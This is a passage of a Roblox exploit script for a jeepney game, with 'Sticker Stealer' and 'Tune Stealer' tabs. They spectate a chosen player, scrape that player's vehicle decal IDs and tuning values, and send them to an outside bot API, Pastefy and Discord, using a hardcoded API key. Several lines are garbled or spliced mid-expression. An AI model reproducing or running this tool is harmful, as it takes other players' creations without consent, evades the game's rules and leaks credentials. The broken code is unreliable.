        buttonSound.Volume = 10
    end
end)

local function ReplaceIcons()
    local topLabels = PlayerGui:WaitForChild("Screen"):WaitForChild("Labels"):WaitForChild("TopLabels")
    local cashLabel = topLabels:WaitForChild("Cash"):WaitForChild("ImageLabel")
    cashLabel.Image = "rbxassetid://95066267081116"
    local baryaLabel = topLabels:WaitForChild("Barya"):WaitForChild("ImageLabel")
    baryaLabel.Image = "rbxassetid://71830499451478"
end

pcall(ReplaceIcons)

-- ============================================================
-- STICKER STEALER PAGE
-- ============================================================

local tabSticker = Window:AddTab({ Title = "Stickers", Icon = "solar/gallery-bold" })

tabSticker:AddSection("Sticker Stealer")

local _BotAPI = "https://sticker-production-da81.up.railway.app"
local _APIKey = "Tg4lVox0ZKXjpooMdWSroQmTHtT8M4Co"
local _GalleryDomain = "https://sticker-webhook.netlify.app/"
local _HttpService = game:GetService("HttpService")
local _StarterGui = game:GetService("StarterGui")

local _stickerPlayers = game:GetService("Players")
local _stickerLocal  = _stickerPlayers.LocalPlayer
local _stickerTarget = ""
local _stickerSpectating = false

local _stickerPlayerNames = {}
for _, plr in ipairs(_stickerPlayers:GetPlayers()) do
    if plr ~= _stickerLocal then
        table.insert(_stickerPlayerNames, plr.Name)
    end
end
if #_stickerPlayerNames == 0 then
    _stickerPlayerNames = {"No Players"}
end

local function _GetVehicleDecals(ws)
    local found = {}
    local function recurse(obj)
        for _, child in ipairs(obj:GetChildren()) do
            if child:IsA("Model") and (child:FindFirstChild("DriveSeat") or child:FindFirstChild("VehicleSeat") or child.Name:lower():find("jeep")) then
                local ownerVal = child:FindFirstChild("Owner") or child:FindFirstChild("PlayerName") or child:FindFirstChild("Player")
                local owner = ownerVal and tostring(ownerVal.Value) or ""
                table.insert(found, {Model = child, Owner = owner})
            end
            recurse(child)
        end
    end
    recurse(ws)
    local results = {}
    for _, data in ipairs(found) do
        local decals = {}
        local cache = {}
        for _, desc in ipairs(data.Model:GetDescendants()) do
            if desc:IsA("Decal") and desc.Texture ~= "" then
                local id = tostring(desc.Texture:match("%d+"))
                if id and not cache[id] then
                    table.insert(decals, id)
                    cache[id] = true
                end
            end
        end
        if #decals > 0 then
            table.insert(results, {Vehicle = data.Model, Owner = data.Owner, Decals = decals})
        end
    end
    return results
end

local function _FindTargetVehicle(target, ws)
    local data = _GetVehicleDecals(ws)
    for _, v in ipairs(data) do if v.Owner == target then return v end end
    for _, v in ipairs(data) do if v.Vehicle.Name:lower():find(target:lower()) then return v end end
    return nil
end

local function _OpenStickerPreview(decalsList, targetName)
    local existingGui = _stickerLocal:WaitForChild("PlayerGui"):FindFirstChild("StickerStealerGui")
    if existingGui then existingGui:Destroy() end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "StickerStealerGui"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = _stickerLocal:WaitForChild("PlayerGui")

    local Main = Instance.new("Frame")
    Main.Parent = ScreenGui
    Main.Size = UDim2.fromOffset(520, 320)
    Main.Position = UDim2.fromScale(0.5, 0.5)
    Main.AnchorPoint = Vector2.new(0.5, 0.5)
    Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    Main.ClipsDescendants = true

    local MainGradient = Instance.new("UIGradient")
    MainGradient.Parent = Main
    MainGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 18)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 8))
    }
    MainGradient.Rotation = 45
    local _ci2057 = Instance.new("UICorner")
    _ci2057.CornerRadius = UDim.new(0, 14)
    _ci2057.Parent = Main

    local Outline = Instance.new("UIStroke")
    Outline.Parent = Main
    Outline.Color = Color3.fromRGB(255, 255, 255)
    Outline.Thickness = 1.4
    Outline.Transparency = 0.7

    local TopBar = Instance.new("Frame")
    TopBar.Parent = Main
    TopBar.Size = UDim2.new(1, 0, 0, 42)
    TopBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    TopBar.ZIndex = 3
    local TopGradient = Instance.new("UIGradient")
    TopGradient.Parent = TopBar
    TopGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 28, 28)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))
    }
    TopGradient.Rotation = 90
    local _ci2074 = Instance.new("UICorner")
    _ci2074.CornerRadius = UDim.new(0, 14)
    _ci2074.Parent = TopBar

    local Title = Instance.new("TextLabel")
    Title.Parent = TopBar
    Title.Size = UDim2.new(1, -80, 1, 0)
    Title.Position = UDim2.new(0, 16, 0, 0)
    Title.BackgroundTransparency = 1
    Title. .. targetName
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamSemibold
    Title.TextSize = 16
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.ZIndex = 4

    local Close = Instance.new("TextButton")
    Close.Parent = TopBar
    Close.Size = UDim2.new(0, 36, 0, 36)
    Close.Position = UDim2.new(1, -44, 0, 3)
    Close.BackgroundTransparency = 1
    Close.
    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
    Close.Font = Enum.Font.GothamBold
    Close.TextSize = 18
    Close.ZIndex = 4

    local SideBar = Instance.new("Frame")
    SideBar.Parent = Main
    SideBar.Size = UDim2.new(0, 52, 1, 0)
    SideBar.Position = UDim2.new(0, 0, 0, 0)
    SideBar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    SideBar.ZIndex = 2
    local SideGradient = Instance.new("UIGradient")
    SideGradient.Parent = SideBar
    SideGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 25)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 12, 12))
    }
    SideGradient.Rotation = 90
    local _ci2108 = Instance.new("UICorner")
    _ci2108.CornerRadius = UDim.new(0, 14)
    _ci2108.Parent = SideBar

    local RotLabel = Instance.new("TextLabel")
    RotLabel.Parent = SideBar
    RotLabel.Size = UDim2.new(0, 120, 0, 28)
    RotLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    RotLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    RotLabel.BackgroundTransparency = 1
    RotLabel.
    RotLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    RotLabel.Font = Enum.Font.GothamBold
    RotLabel.TextSize = 14
    RotLabel.Rotation = 90
    RotLabel.ZIndex = 3
    local Grad = Instance.new("UIGradient")
    Grad.Parent = RotLabel
    Grad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 160, 160))
    }
    Grad.Rotation = 90

    local Content = Instance.new("Frame")
    Content.Parent = Main
    Content.Size = UDim2.new(1, -68, 0, 85)
    Content.Position = UDim2.new(0, 60, 0, 50)
    Content.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Content.ClipsDescendants = true
    Content.ZIndex = 1
    local ContentGradient = Instance.new("UIGradient")
    ContentGradient.Parent = Content
    ContentGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 22)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 12, 12))
    }
    local _ci2139 = Instance.new("UICorner")
    _ci2139.CornerRadius = UDim.new(0, 12)
    _ci2139.Parent = Content

    local seen = {}

    local Thumb = Instance.new("ImageLabel")
    Thumb.Parent = Content
    Thumb.Size = UDim2.new(1, -18, 1, -18)
    Thumb.Position = UDim2.new(0, 9, 0, 9)
    Thumb.BackgroundTransparency = 1
    Thumb.ScaleType = Enum.ScaleType.Crop
    Thumb.ZIndex = 1

    local Sticker = Instance.new("ImageLabel")
    Sticker.Parent = Content
    Sticker.Size = UDim2.new(0, 60, 0, 60)
    Sticker.Position = UDim2.new(0, 10, 0.5, -30)
    Sticker.BackgroundTransparency = 1
    Sticker.ScaleType = Enum.ScaleType.Fit
    Sticker.ZIndex = 2
    local _ci2156 = Instance.new("UICorner")
    _ci2156.CornerRadius = UDim.new(0, 8)
    _ci2156.Parent = Sticker
    local _ci2157 = Instance.new("UIAspectRatioConstraint")
    _ci2157.AspectRatio = 1
    _ci2157.Parent = Sticker

    local NumberTex = Instance.new("TextLabel")
    NumberTex.Parent = Content
    NumberTex.Size = UDim2.new(1, -85, 0, 24)
    NumberTex.Position = UDim2.new(0, 78, 0.5, -12)
    NumberTex.BackgroundTransparency = 1
    NumberTex.TextColor3 = Color3.fromRGB(255, 255, 255)
    NumberTex.Font = Enum.Font.GothamBold
    NumberTex.TextSize = 12
    NumberTex.TextXAlignment = Enum.TextXAlignment.Left
    NumberTex.ZIndex = 2
    NumberTex.

    local ResultFrame = Instance.new("ScrollingFrame")
    ResultFrame.Parent = Main
    ResultFrame.Size = UDim2.new(1, -68, 1, -143)
    ResultFrame.Position = UDim2.new(0, 60, 0, 141)
    ResultFrame.BackgroundTransparency = 1
    ResultFrame.ScrollBarThickness = 4
    ResultFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    ResultFrame.ZIndex = 1

    local Layout = Instance.new("UIListLayout")
    Layout.Parent = ResultFrame
    Layout.Padding = UDim.new(0, 4)
    Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        ResultFrame.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y + 4)
    end)

    local function UpdatePreview(id)
        Thumb.Image = "rbxthumb://type=Asset&&w=420&h=420"
        Sticker.Image = "rbxassetid://" .. id
        NumberTex.Text = id
    end

    local function CreateRow(id)
        if seen[id] then return end
        seen[id] = true

        local Row = Instance.new("TextButton")
        Row.Parent = ResultFrame
        Row.Size = UDim2.new(1, -8, 0, 44)
        Row.
        Row.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        Row.ZIndex = 1
        local _ci2199 = Instance.new("UICorner")
        _ci2199.CornerRadius = UDim.new(0, 6)
        _ci2199.Parent = Row

        local Icon = Instance.new("ImageLabel")
        Icon.Parent = Row
        Icon.Size = UDim2.new(0, 36, 0, 36)
        Icon.Position = UDim2.new(0, 6, 0.5, -18)
        Icon.BackgroundTransparency = 1
        Icon.ScaleType = Enum.ScaleType.Crop
        Icon.Image = "rbxthumb://type=Asset&&w=150&h=150"
        Icon.ZIndex = 2

        local Txt = Instance.new("TextLabel")
        Txt.Parent = Row
        Txt.Size = UDim2.new(1, -110, 1, 0)
        Txt.Position = UDim2.new(0, 50, 0, 0)
        Txt.BackgroundTransparency = 1
        Txt.Text = id
        Txt.TextColor3 = Color3.fromRGB(255, 255, 255)
        Txt.Font = Enum.Font.GothamMedium
        Txt.TextSize = 14
        Txt.TextXAlignment = Enum.TextXAlignment.Left

        local Btn = Instance.new("TextButton")
        Btn.Parent = Row
        Btn.Size = UDim2.new(0, 54, 0, 26)
        Btn.Position = UDim2.new(1, -60, 0.5, -13)
        Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Btn.
        Btn.TextColor3 = Color3.fromRGB(0, 0, 0)
        Btn.Font = Enum.Font.GothamBold
        Btn.TextSize = 12
        local _ci2227 = Instance.new("UICorner")
        _ci2227.CornerRadius = UDim.new(0, 6)
        _ci2227.Parent = Btn

        Btn.MouseButton1Click:Connect(function()
            if setclipboard then setclipboard(id) end
        end)
        Row.MouseButton1Click:Connect(function()
            UpdatePreview(id)
        end)
    end

    for _, id in ipairs(decalsList) do
        CreateRow(id)
    end

    Close.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
end

local function _StickerNotify(msg)
    Library:Notification({
        Title = "Sticker Stealer",
        Desc = msg,
        Color = "#8B5CF6",
        Duration = 4
    })
end

tabSticker:AddDropdown("dd20", {
    Title = "Target Player",
    List = _stickerPlayerNames,
    Value = _stickerPlayerNames[1],
    Callback = function(v)
        _stickerTarget = v
    end
})

tabSticker:AddToggle("tg19", {
    Title = "View Player",
    Default = false,
    Callback = function(v)
        _stickerSpectating = v
        if v and _stickerTarget ~= "" then
            local targetPlayer = _stickerPlayers:FindFirstChild(_stickerTarget)
            if targetPlayer and targetPlayer.Character then
                workspace.CurrentCamera.CameraSubject = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
            end
        else
            if _stickerLocal.Character then
                workspace.CurrentCamera.CameraSubject = _stickerLocal.Character:FindFirstChildOfClass("Humanoid")
            end
        end
    end
})

tabSticker:AddButton({
    Title = "Review Stickers",
    Callback = function()
        if _stickerTarget == "" or _stickerTarget == "No Players" then
            _StickerNotify("Pumili muna ng target player!")
            return
        end

        local targetData = _FindTargetVehicle(_stickerTarget, workspace)
        if not targetData or not targetData.Decals or #targetData.Decals == 0 then
            _StickerNotify("Walang jeep o sticker si " .. _stickerTarget:upper())
            return
        end

        local decals    = targetData.Decals
        local count     = #decals
        local stickerList = table.concat(decals, "\n")

        -- Open in-game preview
        _OpenStickerPreview(decals, _stickerTarget)

        -- Build date string
        local t = os.date("*t")
        local months = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"}
        local dh = t.hour % 12; if dh == 0 then dh = 12 end
        local dateStr = string.format("%s %d, %d %d:%02d %s",
            months[t.month], t.day, t.year, dh, t.min, t.hour >= 12 and "PM" or "AM")

        -- Upload to Pastefy
        local pasteUrl = nil
        pcall(function()
            local Http = request or (syn and syn.request) or http_request
            if not Http then return end
            local pasteContent = "Stickers from: " .. _stickerTarget .. "\nDate: " .. dateStr .. "\n\n" .. stickerList
            local resp = Http({
                Url    = "https://pastefy.app/api/v2/paste",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body   = _HttpService:JSONEncode({
                    content = pasteContent,
                    title   = _stickerTarget .. "_stickers",
                    type    = "PASTE"
                })
            })
            if resp and resp.Body then
                local ok
                local data
                ok, data = pcall(function() return _HttpService:JSONDecode(resp.Body) end)
                if ok and data and data.paste and data.paste.id then
                    pasteUrl = "https://pastefy.app/" .. data.paste.id
                end
            end
        end)

        local pasteId   = pasteUrl and pasteUrl:match("/([^/]+)$") or nil
        local galleryUrl = pasteId and (_GalleryDomain .. "?/steal",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["x-api-key"]    = _APIKey
                },
                Body = _HttpService:JSONEncode({
                    target      = _stickerTarget,
                    stickerName = _stickerTarget .. "'s Stickers",
                    decals      = decalTable,
                    pasteUrl    = pasteUrl,
                    galleryUrl  = galleryUrl,
                    date        = dateStr
                })
            })
        end)

        _StickerNotify("Stolen " .. count .. " sticker(s) from " .. _stickerTarget:upper() .. "!")
    end
})

-- STARTUP NOTIFICATION

-- ============================================================
-- TUNE STEALER PAGE
-- ============================================================

local tabTune = Window:AddTab({ Title = "Tune", Icon = "solar/menu-dots-bold" })

tabTune:AddSection("Tune Stealer")

local _BotAPI_Tune = "https://sticker-production-da81.up.railway.app"
local _APIKey_Tune = "Tg4lVox0ZKXjpooMdWSroQmTHtT8M4Co"
local _HttpSvc     = game:GetService("HttpService")

local _tunePlayers  = game:GetService("Players")
local _tuneLocal    = _tunePlayers.LocalPlayer
local _tuneTarget   = ""
local _tuneSpectate = false

local _tunePlayerNames = {}
for _, plr in ipairs(_tunePlayers:GetPlayers()) do
    if plr ~= _tuneLocal then
        table.insert(_tunePlayerNames, plr.Name)
    end
end
if #_tunePlayerNames == 0 then
    _tunePlayerNames = {"No Players"}
end

local function _FindJeep(targetName)
    local jeepnies = workspace:FindFirstChild("Jeepnies")
    if jeepnies then
        local direct = jeepnies:FindFirstChild(targetName)
        if direct then return direct end
        for _, v in ipairs(jeepnies:GetChildren()) do
            if v.Name:lower():find(targetName:lower()) then return v end
        end
    end
    local function recurse(parent, depth)
        if depth > 5 then return nil end
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("Model") then
                local ov = child:FindFirstChild("Owner") or child:FindFirstChild("PlayerName") or child:FindFirstChild("OwnerName")
                if ov and tostring(ov.Value) == targetName then return child end
            end
            local found = recurse(child, depth + 1)
            if found then return found end
        end
    end
    return recurse(workspace, 0)
end

local function _ReadTune(jeep)
    -- Accurate jeep name from Index attribute (e.g. "Morales 10 Seater_#5")
    local jeepIndex = jeep:GetAttribute("Index") or jeep.Name

    -- Map Index to accurate display name
    local jeepName = jeepIndex:gsub("_#%d+$", ""):gsub("%s*#%d+$", "")
    local indexLower = jeepIndex:lower()
    local jeepMap = {
        { key = "sarao custombuilt v1",      name = "Sarao Custombuilt V1"        },
        { key = "sarao custombuilt model 2", name = "Sarao Custombuilt Model 2.0"  },
        { key = "sarao custombuilt",         name = "Sarao Custombuilt V1"        },
        { key = "df devera",                 name = "DF Devera Long Model"         },
        { key = "devera",                    name = "DF Devera Long Model"         },
        { key = "morales",                   name = "Morales Jeepney"              },
        { key = "milwaukee",                 name = "Milwaukee Jeepney"            },
        { key = "xlt auv",                   name = "XLT AUV"                     },
        { key = "xlt",                       name = "XLT AUV"                     },
    }
    for _, entry in ipairs(jeepMap) do
        if indexLower:find(entry.key, 1, true) then
            jeepName = entry.name
            break
        end
    end

    -- FrontHeight, RearHeight from TuneValues attributes
    local fh = 0
    local rh = 0
    local tv = jeep:FindFirstChild("TuneValues", true)
    if tv then
        fh = tv:GetAttribute("FrontHeight") or 0
        rh = tv:GetAttribute("RearHeight")  or 0
    end

    -- Stiffness & Damping from SpringConstraints
    local fs = 0
    local fd = 0
    local rs = 0
    local rd = 0
    local wheels = jeep:FindFirstChild("Wheels")
    if wheels then
        for _, wName in ipairs({"FR", "FL"}) do
            local w = wheels:FindFirstChild(wName)
            if w then
                for _, desc in ipairs(w:GetDescendants()) do
                    if desc:IsA("SpringConstraint") then
                        fs = desc.Stiffness
                        fd = desc.Damping
                        break
                    end
                end
                if fs ~= 0 then break end
            end
        end
        for _, wName in ipairs({"RR", "RL"}) do
            local w = wheels:FindFirstChild(wName)
            if w then
                for _, desc in ipairs(w:GetDescendants()) do
                    if desc:IsA("SpringConstraint") then
                        rs = desc.Stiffness
                        rd = desc.Damping
                        break
                    end
                end
                if rs ~= 0 then break end
            end
        end
    end

    -- Build exact import/export code (same format as game Export Tuning)
    local tuneCode = string.format(
        "fh;%.4f;rh;%.4f;fs;%.4f;rs;%.4f;fd;%.4f;rd;%.4f",
        fh, rh, fs, rs, fd, rd
    )

    return {
        jeepIndex = jeepIndex,
        jeepName  = jeepName,
        fh = fh, rh = rh,
        fs = fs, fd = fd,
        rs = rs, rd = rd,
        tuneCode  = tuneCode,
    }
end

local function _TuneNotify(msg)
    Library:Notification({
        Title    = "Tune Stealer",
        Desc     = msg,
        Color    = "#FF8C00",
        Duration = 4
    })
end

tabTune:AddDropdown("dd22", {
    Title = "Target Player",
    List  = _tunePlayerNames,
    Value = _tunePlayerNames[1],
    Callback = function(v)
        _tuneTarget = v
    end
})

tabTune:AddToggle("tg21", {
    Title   = "View Player",
    Default = false,
    Callback = function(v)
        _tuneSpectate = v
        if v and _tuneTarget ~= "" then
            local tp = _tunePlayers:FindFirstChild(_tuneTarget)
            if tp and tp.Character then
                workspace.CurrentCamera.CameraSubject = tp.Character:FindFirstChildOfClass("Humanoid")
            end
        else
            if _tuneLocal.Character then
                workspace.CurrentCamera.CameraSubject = _tuneLocal.Character:FindFirstChildOfClass("Humanoid")
            end
        end
    end
})

tabTune:AddButton({
    Title = "Steal Tune",
    Callback = function()
        if _tuneTarget == "" or _tuneTarget == "No Players" then
            _TuneNotify("Pumili muna ng target player!")
            return
        end

        _TuneNotify("Hinahanap jeep ni " .. _tuneTarget .. "...")

        task.spawn(function()
            local jeep = _FindJeep(_tuneTarget)
            if not jeep then
                _TuneNotify("Walang jeep nahanap para kay " .. _tuneTarget)
                return
            end

            local tuneData = _ReadTune(jeep)

            -- Print to console
            print("=== BELLE.SG TUNE STEALER ===")
            print("Player   : " .. _tuneTarget)
            print("Jeep     : " .. tuneData.jeepIndex)
            print("Front H  : " .. tuneData.fh)
            print("Front S  : " .. tuneData.fs)
            print("Front D  : " .. tuneData.fd)
            print("Rear H   : " .. tuneData.rh)
            print("Rear S   : " .. tuneData.rs)
            print("Rear D   : " .. tuneData.rd)
            print("Code     : " .. tuneData.tuneCode)
            print("=============================")

            local t = os.date("*t")
            local months = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"}
            local dh = t.hour % 12; if dh == 0 then dh = 12 end
            local dateStr = string.format("%s %d, %d %d:%02d %s",
                months[t.month], t.day, t.year, dh, t.min, t.hour >= 12 and "PM" or "AM")

            local success = false
            pcall(function()
                local Http = request or (syn and syn.request) or http_request
                if not Http then return end
                local res = Http({
                    Url    = _BotAPI_Tune .. "/tune",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["x-api-key"]    = _APIKey_Tune
                    },
                    Body = _HttpSvc:JSONEncode({
                        target          = _tuneTarget,
                        jeepName        = tuneData.jeepIndex,
                        frontHeight     = tuneData.fh,
                        frontStiffness  = tuneData.fs,
                        frontDampening  = tuneData.fd,
                        rearHeight      = tuneData.rh,
                        rearStiffness   = tuneData.rs,
                        rearDampening   = tuneData.rd,
                        tuneCode        = tuneData.tuneCode,
                        date            = dateStr
                    })
                })
                success = res and (res.StatusCode == 200 or res.StatusCode == 204)
            end)

            if success then
                _TuneNotify("Tune ni " .. _tuneTarget:upper() .. " na-steal at na-send sa Discord!")
            else
                _TuneNotify("Na-read tune pero bot failed. Check console.")
            end
        end)
    end
})

-- ============================================================
-- STARTUP NOTIFICATION
-- ============================================================

Library:Notification({
    Title = "BELLE.SG",
    Color = "#8B5CF6",
    Duration = 3
})

local tabSettings = Window:AddTab({ Title = "Settings", Icon = "solar/settings-bold" })

SaveManager:SetLibrary(Fluent)
SaveManager:SetFolder("BelleSgDNS/Config")
SaveManager:IgnoreThemeSettings()
SaveManager:BuildConfigSection(tabSettings)
SaveManager:LoadAutoloadConfig()

InterfaceManager:SetLibrary(Fluent)
InterfaceManager:SetFolder("BelleSgDNS")
InterfaceManager:BuildInterfaceSection(tabSettings)
InterfaceManager:LoadSettings()


-- Floating Button
local _pg = _lp:WaitForChild("PlayerGui")
local _sg = Instance.new("ScreenGui")
_sg.Name="BelleSgBtn"; _sg.ResetOnSpawn=false; _sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
_sg.Parent=_pg

local _fr = Instance.new("Frame")
_fr.Size=UDim2.new(0,52,0,52); _fr.Position=UDim2.new(0,16,0.5,-26)
_fr.BackgroundColor3=Color3.fromRGB(12,8,28); _fr.BorderSizePixel=0
_fr.Active=true; _fr.Parent=_sg
local _fc=Instance.new("UICorner",_fr); _fc.CornerRadius=UDim.new(1,0)
local _fs=Instance.new("UIStroke",_fr); _fs.Color=Color3.fromRGB(139,92,246); _fs.Thickness=2

local _il = Instance.new("ImageLabel")
_il.Parent = _fr
_il.Size=UDim2.new(0,40,0,40); _il.Position=UDim2.new(0.5,0,0.5,0)
_il.AnchorPoint=Vector2.new(0.5,0.5); _il.BackgroundTransparency=1
_il.Image="rbxassetid://74730846535909"; _il.ScaleType=Enum.ScaleType.Fit

local _tb = Instance.new("TextButton")
_tb.Parent = _fr
_tb.Size=UDim2.new(1,0,1,0); _tb.BackgroundTransparency=1; _tb.Text=""

local _open=true
_tb.MouseButton1Click:Connect(function()
    _open=not _open
    if _open then Window:Show() else Window:Hide() end
end)

-- Drag
local _dg=false
local _ds=nil
local _sp=nil
_fr.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
        _dg=true; _ds=i.Position; _sp=_fr.Position
        i.Changed:Connect(function()
            if i.UserInputState==Enum.UserInputState.End then _dg=false end
        end)
    end
end)
game:GetService("UserInputService").InputChanged:Connect(function(i)
    if _dg and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
        local d=i.Position-_ds
        _fr.Position=UDim2.new(_sp.X.Scale,_sp.X.Offset+d.X,_sp.Y.Scale,_sp.Y.Offset+d.Y)
    end
end)

Window:SelectTab(1)
Fluent:Notify({ Title = "Belle.sg", Content = "Diesel n\'Steel loaded!", Type = "Success", Duration = 4 })
